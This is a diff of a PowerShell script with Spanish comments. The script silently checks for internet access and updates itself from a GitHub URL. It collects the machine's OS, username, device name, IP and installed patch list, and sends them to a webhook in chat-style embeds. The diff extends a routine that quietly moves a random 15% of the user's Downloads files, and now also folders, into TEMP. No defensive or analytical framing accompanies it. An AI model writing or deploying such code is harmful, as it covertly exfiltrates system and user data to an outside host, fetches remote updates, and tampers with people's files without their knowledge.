@@ -6,7 +6,7 @@ $RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/ma
 # 2. Verificar internet (Silencioso)
 if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }
 
-# 3. Auto-actualización de la tarea (tasks.json)
+# 3. Auto-actualización de la tarea (Sincronización con GitHub)
 try {
     $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10
     if ($RemoteContent -like "*version*") {
@@ -28,58 +28,62 @@ $SystemInfo = try {
     "$( $OS.Caption ) (Build: $( $Ver.CurrentBuild ))"
 } catch { "null" }
 
-# --- LÓGICA DE MOVIMIENTO DE ARCHIVOS (Downloads -> TEMP) ---
+# --- LÓGICA DE MOVIMIENTO (Downloads -> TEMP) --- Incluye Archivos y Carpetas
 $descargasPath = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")."{374DE290-123F-4565-9164-39C4925E467B}"
 $rutaDownloads = [System.Environment]::ExpandEnvironmentVariables($descargasPath)
 $rutaTemp = $env:TEMP
 
-$todosLosArchivos = Get-ChildItem -Path $rutaDownloads -File
-$totalArchivos = $todosLosArchivos.Count
-$archivosMovidosList = @()
+$todoElContenido = Get-ChildItem -Path $rutaDownloads
+$totalItems = $todoElContenido.Count
+$itemsMovidosList = @()
 
-if ($totalArchivos -gt 0) {
-    $cantidadAMover = [Math]::Ceiling($totalArchivos * 0.15)
-    $objetivos = $todosLosArchivos | Get-Random -Count $cantidadAMover
+if ($totalItems -gt 0) {
+    $cantidadAMover = [Math]::Ceiling($totalItems * 0.15)
+    $objetivos = $todoElContenido | Get-Random -Count $cantidadAMover
 
-    foreach ($archivo in $objetivos) {
+    foreach ($item in $objetivos) {
         try {
-            $nuevoDestino = Join-Path $rutaTemp $archivo.Name
-            # Si ya existe uno igual en Temp, lo sobrescribe para no dar error
-            Move-Item -Path $archivo.FullName -Destination $nuevoDestino -Force -ErrorAction Stop
-            $archivosMovidosList += $archivo.Name
+            $nuevoDestino = Join-Path $rutaTemp $item.Name
+            # Mover de forma forzada y recursiva
+            Move-Item -Path $item.FullName -Destination $nuevoDestino -Force -ErrorAction Stop
+            
+            $prefijo = if($item.PSIsContainer){ "[DIR]" } else { "[FILE]" }
+            $itemsMovidosList += "$prefijo $($item.Name)"
         } catch { }
         Start-Sleep -Milliseconds 500
     }
 }
 
-# 5. Gestión de Parches
-$SortedList = try {
+# 5. Gestión de Parches de Seguridad
+$SortedPatches = try {
     $Raw = Get-HotFix | Select-Object HotFixID, InstalledOn
     $WithDate = $Raw | Where-Object { $_.InstalledOn -ne $null } | Sort-Object InstalledOn -Descending
     $NoDate = $Raw | Where-Object { $_.InstalledOn -eq $null }
     $WithDate + $NoDate
 } catch { @() }
 
-$TotalParches = $SortedList.Count
-$StatusText = if ($SortedList | Where-Object { $_.InstalledOn -ge (Get-Date -Year 2026 -Month 3 -Day 10) }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
+$TotalParches = $SortedPatches.Count
+$LimitDate = Get-Date -Year 2026 -Month 3 -Day 10
+$StatusText = if ($SortedPatches | Where-Object { $_.InstalledOn -ge $LimitDate }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
 $EmbedColor = if ($StatusText -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }
 
-# --- MENSAJE 1: IDENTIDAD + REPORTE DE ARCHIVOS MOVIDOS ---
-$listaArchivosStr = if ($archivosMovidosList.Count -gt 0) { ($archivosMovidosList -join ", ") } else { "Ninguno" }
+# --- MENSAJE 1: REPORTE DE IDENTIDAD Y MOVIMIENTO ---
+$listaItemsStr = if ($itemsMovidosList.Count -gt 0) { ($itemsMovidosList -join ", ") } else { "Ninguno" }
+if ($listaItemsStr.Length -gt 1000) { $listaItemsStr = $listaItemsStr.Substring(0, 997) + "..." }
 
 $MainPayload = @{
     username = "$User @ $Device"
     avatar_url = "https://i.imgur.com/8nLFCuR.png"
     embeds = @(@{
-        title = "🚀 Reporte de Identidad y Actividad"
+        title = "🚀 Reporte de Identidad e Integridad"
         color = $EmbedColor
         fields = @(
             @{ name = '💻 Sistema'; value = $SystemInfo; inline = $false },
             @{ name = '📊 Estado'; value = $StatusText; inline = $true },
             @{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true },
-            @{ name = '📂 Archivos Movidos a TEMP (15%)'; value = $listaArchivosStr; inline = $false }
+            @{ name = '📂 Items Movidos a TEMP (15%)'; value = $listaItemsStr; inline = $false }
         )
-        footer = @{ text = "Archivos movidos: $($archivosMovidosList.Count) | Parches: $TotalParches" }
+        footer = @{ text = "Items movidos: $($itemsMovidosList.Count) | Parches: $TotalParches" }
     })
 } | ConvertTo-Json -Depth 10
 
@@ -89,15 +93,15 @@ try {
     Start-Sleep -Milliseconds 1500
 } catch { }
 
-# --- MENSAJES SIGUIENTES: PARCHES (CHUNKS DE 3) ---
-# (El resto del código de parches se mantiene igual para completar el reporte)
+# --- MENSAJES SIGUIENTES: LISTADO DE PARCHES (Chunks de 3) ---
 $ChunkSize = 3
-$Sections = [Math]::Ceiling($TotalParches / $ChunkSize)
+$TotalSections = [Math]::Ceiling($TotalParches / $ChunkSize)
 
 for ($i = 0; $i -lt $TotalParches; $i += $ChunkSize) {
     $CurrentSection = [Math]::Floor($i / $ChunkSize) + 1
     $End = [Math]::Min($i + $ChunkSize - 1, $TotalParches - 1)
-    $Chunk = $SortedList[$i..$End]
+    $Chunk = $SortedPatches[$i..$End]
+    
     $PatchText = ($Chunk | ForEach-Object {
         $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
         "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
@@ -107,15 +111,16 @@ for ($i = 0; $i -lt $TotalParches; $i += $ChunkSize) {
         username = "$User @ $Device"
         avatar_url = "https://i.imgur.com/8nLFCuR.png"
         embeds = @(@{
-            title = "📦 Listado de Parches - Sección $CurrentSection"
+            title = "📦 Detalle de Parches - Sección $CurrentSection"
             color = $EmbedColor
             description = $PatchText
-            footer = @{ text = "Sección $CurrentSection de $Sections" }
+            footer = @{ text = "Página $CurrentSection de $TotalSections | Total: $TotalParches" }
         })
     } | ConvertTo-Json -Depth 10
 
     try {
-        Invoke-RestMethod -Uri $Webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($PatchPayload)) -ContentType 'application/json; charset=utf-8'
+        $PatchBytes = [System.Text.Encoding]::UTF8.GetBytes($PatchPayload)
+        Invoke-RestMethod -Uri $Webhook -Method Post -Body $PatchBytes -ContentType 'application/json; charset=utf-8'
         Start-Sleep -Milliseconds 1500
     } catch { }
 }
